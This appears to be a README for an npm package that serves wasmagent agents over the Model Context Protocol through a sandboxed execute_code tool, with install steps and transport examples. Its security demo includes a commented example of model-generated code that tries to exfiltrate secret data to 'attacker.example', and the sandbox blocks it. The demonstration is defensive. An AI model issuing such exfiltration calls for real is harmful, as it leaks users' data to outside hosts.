# /mcp-server

[![Glama MCP server](https://glama.ai/mcp/servers/WasmAgent/wasmagent-js/badges/score.svg)](https://glama.ai/mcp/servers/WasmAgent/wasmagent-js)

Expose any wasmagent agent as a Model Context Protocol (MCP) server.

> Part of [wasmagent](https://github.com/WasmAgent/wasmagent-js) — a TypeScript + WASM agent runtime.

## Before / After

Replacing a bare tool list published directly to the host with a sandboxed
`execute_code` surface:

```diff
+import { createCodeModeServer, runStdio } from "@wasmagent/mcp-server/stdio";
+import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
+import { ToolRegistry } from "@wasmagent/core";

-// Before: host sees every tool directly — 40 tools × schema = huge context cost
-server.setRequestHandler(ListToolsRequestSchema, () => ({
-  tools: [...allFortyTools],
-}));
+// After: host sees ONLY docs_search + execute_code; model dispatches internally
+const tools = new ToolRegistry();
+// tools.register(...) — register your 40 tools here
+
+await runStdio(createCodeModeServer({
+  tools,
+  kernel: new QuickJSKernel(),
+  capabilities: { allowedHosts: [], cpuMs: 5_000 },
+  serverInfo: { name: "my-agent", version: "1.0.0" },
+}));
```

At N=30 downstream tools the bootstrap-token cost drops to 13.6% of the direct
approach. The model calls `execute_code` with a script; the script calls
`callTool(...)` for whichever tools it needs — all under one `CapabilityManifest`.

## Install

```bash
npm install /mcp-server /core
```

## Three transports, one server

The `McpAgentServer` is **transport-agnostic**: it speaks JSON-RPC
through a single `handle(req)` method. Pick the transport that fits
your host:

### 1. Stdio (Claude Desktop, Cursor, Glama health-check, …)

```bash
# Zero-config default — code-mode server with VmKernel and no
# downstream tools. Useful for sanity / introspection only.
npx /mcp-server
```

For a real deployment, write a small Node script and call
`runStdio()` with your own server:

```ts
// server.mjs
import { createCodeModeServer, runStdio } from "/mcp-server/stdio";
import { QuickJSKernel } from "/kernel-quickjs";
import { ToolRegistry } from "/core";

const tools = new ToolRegistry();
// tools.register(...)  — your tools here

await runStdio(createCodeModeServer({
  tools,
  kernel: new QuickJSKernel(),
  capabilities: { allowedHosts: [], cpuMs: 5000 },
  serverInfo: { name: "my-agent", version: "1.0.0" },
}));
```

### 2. HTTP / Streamable (Cloudflare Workers, Vercel, etc.)

```ts
import { createCodeModeServer, createFetchHandler } from "/mcp-server";

const server = createCodeModeServer({ /* … */ });
const handler = createFetchHandler(server);
// In a Worker: export default { fetch: handler }
```

### 3. Direct `handle()`

If you have a custom transport, the protocol-level brain is one
`async (req) => { response }` call away — see `McpAgentServer.handle()`.

## Code-mode (two-tool surface)

`createCodeModeServer()` wraps any tool registry into a
`docs_search` + `execute_code` MCP surface. At N=30 downstream
tools the bootstrap-token cost drops to 13.6% of direct MCP. See
[docs/guides/code-mode.md](https://github.com/WasmAgent/wasmagent-js/blob/main/docs/guides/code-mode.md).

## Security demo

`CapabilityManifest` enforces network and filesystem policy at the kernel
boundary for every script the model runs through `execute_code`:

```ts
import { createCodeModeServer, runStdio } from "@wasmagent/mcp-server/stdio";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";
import { ToolRegistry } from "@wasmagent/core";

const tools = new ToolRegistry();
// tools.register(...)

await runStdio(createCodeModeServer({
  tools,
  kernel: new QuickJSKernel(),
  capabilities: {
    allowedHosts: [],           // no outbound network
    allowedPaths: [],           // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
  serverInfo: { name: "my-agent", version: "1.0.0" },
}));

// Model-generated code inside execute_code that tries to exfiltrate data:
// fetch("https://attacker.example/exfil?data=secret")
// → throws: network access denied — host "attacker.example" not in allowedHosts
```

The manifest is enforced regardless of which downstream tools the script
calls — one declaration covers the entire `execute_code` surface.

## License

[Apache-2.0](./LICENSE) — © wasmagent contributors
